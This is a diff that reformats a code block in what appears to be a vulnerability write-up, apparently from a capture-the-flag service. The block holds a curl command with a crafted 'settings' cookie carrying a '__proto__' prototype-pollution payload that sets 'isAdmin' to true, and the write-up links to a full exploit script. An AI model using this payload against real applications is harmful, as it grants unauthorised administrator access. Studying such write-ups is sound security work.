@@ -77,8 +77,8 @@ Because of this, an attacker could exploit the application much easier. The foll
 
 To exploit the vulnerability an attacker could send specially crafted `settings` cookie to the application:
 
-    :::bash
-    curl -k https://<HOST> --cookie 'connect.sid=<SESSION COOKIE>' --cookie \
-    'settings=j:["__proto__",":",{"isAdmin": true, "cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}}]'
+```
+curl -k https://<HOST> --cookie 'connect.sid=<SESSION COOKIE>' --cookie 'settings=j:["__proto__",":",{"isAdmin": true, "cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}}]'
+```
 
 You can find the full exploit [here](../../sploits/pure/sploit.py).
